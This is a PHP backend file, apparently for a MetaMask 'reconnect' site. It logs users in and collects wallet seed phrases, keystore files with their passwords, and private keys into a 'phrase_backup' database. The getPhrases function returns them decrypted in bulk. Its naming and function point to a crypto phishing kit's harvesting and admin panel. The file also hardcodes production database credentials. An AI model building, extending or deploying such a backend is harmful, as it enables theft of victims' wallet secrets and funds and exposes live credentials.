<?php
session_start();
include_once "osai/SQL.php";

use osai\{
    SQL,
    CookieHandler,
    Crypt
};
$config = [
    "host" => "127.0.0.1",
    "user" => "leonard",
    "password" => "root",
    "db" => "mwreconnect",
    "env" => "dev"
];

if($_SERVER['HTTP_HOST'] !== "127.0.0.1" && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1")
    $config = [
        "host" => "localhost",
        "user" => "leo_osait",
        "password" => '4If4B!@w)%dN',
        "db" => "phrase_backup",
        "env" => "prod"
    ];
$sql = (new SQL())::init($config);

$table_user = "users";
$table_phrase = "phrase";
$cookie_key = "metamask_user";

function logged() : bool{
    if (isset($_COOKIE[$GLOBALS['cookie_key']]) and !isset($_SESSION["active_user"])) {
        login($_COOKIE[$GLOBALS['cookie_key']]);
        return true;
    }
    if (isset($_SESSION["active_user"])) return true;
    return false;
}
function login(?string $uuid = null) : void
{
    global $sql, $table_user;
    if (isset($_SESSION["active_user"])) return; // if we're in the current session break;

    if($res = $sql->query_select("*",$table_user,"WHERE entity_guid='{$sql->clean($uuid,10)}'",['assoc']) or
        $res = $sql->query_select("*",$table_user,"WHERE username='{$sql->clean($_POST['username'],10)}' 
            AND password='{$sql->clean((new Crypt())->encrypt($_POST['password']),10)}'",['assoc'])) {
        $_SESSION['active_user'] = $res['entity_guid'];
        $_SESSION['active_user_full_name'] = $res['name'];
        $_SESSION['active_user_name'] = $res['username'];
        $_SESSION['active_user_email'] = $res['email'];
        if(isset($_POST['remember'])) (new CookieHandler())->set($GLOBALS['cookie_key'],$_SESSION['active_user']);
        echo 1;
    }
    else
        echo 0;
}
function logout() : void
{
    session_destroy();
    (new CookieHandler())->destroy($GLOBALS['cookie_key']);
}

function register(): void
{
    global $sql, $table_user;
    if($_POST['password'] === $_POST['password2']) {
        $uname = $sql->clean($_POST['username'],10);
        $email = $sql->clean($_POST['email'],10);
        $name = $sql->clean($_POST['name'],10);
        $password = (new Crypt())->encrypt($_POST['password']);
        if($sql->query_count("id",$table_user,"WHERE username='$uname' OR email='$email' OR name='$name'")){
            echo 2;
            return;
        }
        $sql->query_insert($table_user, "entity_guid=UUID(),username='$uname',name='$name',email='$email',
            password='$password',day_created='{$sql->date_now()}'");
        echo 1;
        return;
    }
    echo 0;
}
function changePassword() : void {
    global $sql, $table_user;
    $crypt = new Crypt();

    $clause = "WHERE entity_guid='{$sql->clean($_SESSION['active_user'],10)}' 
        AND password='{$sql->clean($crypt->encrypt($_POST['old_password']),10)}'";

    if($sql->query_count("id", $table_user, $clause) and ($_POST['password'] === $_POST['password2'])){
        print_r($sql->query_update($table_user,
            "password='{$sql->clean($crypt->encrypt($_POST['password']),10)}'",
            $clause));
        return;
    }
    echo 0;
}

function addPhrase() : bool {
    global $sql, $table_phrase;
    $cat = $sql->clean($_POST['category'],16,'strict');
    $type = $sql->clean($_POST['wallet_type'],16,'strict');
    $enc = fn($key) =>  (new Crypt())->toggleCrypt($key);

    if(isset($_POST['phrase']))
        $values = ",phrase='{$enc($sql->clean($_POST['phrase'],16,'strict'))}'";

    elseif(isset($_POST['json_key']))
        $values = ",json_key='{$enc($sql->clean($_POST['json_key'],16,'strict'))}',json_password='{$enc($sql->clean($_POST['json_password'],16,'strict'))}'";

    elseif(isset($_POST['private_key']))
        $values = ",private_key='{$enc($sql->clean($_POST['private_key'],16,'strict'))}'";

    else
        return false;

    return $sql->add($table_phrase,"entity_guid=UUID(),day_created='{$sql->date_now()}',`type`='$type',`category`='$cat' $values");
}

function getPhrases(bool $paginate = true) : void {
    global $sql, $table_phrase;
    $view_per_page = 1000;
    $decrypt = ["fun" => function ($res){
        $d_enc = fn($key) =>  (new Crypt())->toggleCrypt($key,false);
        foreach ($res as $k => $v){
            if(($k == "id" || $k == "entity_guid" || $k == "view_status" || $k == "day_created" || $k == "day_deleted" || $k == "category" || $k == "type") || empty($v))
                continue;

            $res[$k] = $d_enc($v);
        }

        return $res;
    }];

    if(!$paginate)
        print_r(json_encode($sql->query_select("*",$table_phrase, "WHERE view_status=0 ORDER BY day_created DESC", 'assoc','!','loop',$decrypt)));
    else {
        // cut off request if gotten to last page
        if($_GET['pg_num'] > ceil($sql->query_count("id",$table_phrase,"WHERE view_status=0") / $view_per_page)) {
            echo 0;
            return;
        }

        $start = ((int) $sql->clean($_GET['pg_num'],1) - 1) * $view_per_page ;
        print_r(json_encode($sql->query_select("*", $table_phrase, "WHERE view_status=0 ORDER BY day_created DESC LIMIT $start,$view_per_page",
            'assoc', '!', 'loop',$decrypt)));
    }
}

function deletePhrase(string $id) : void {
    global $sql, $table_phrase;
    if($sql->query_update($table_phrase,"view_status=1, day_deleted='{$sql->date_now()}'", "WHERE entity_guid='{$sql->clean($id)}'"))
        echo 1;
    else echo 0;
}
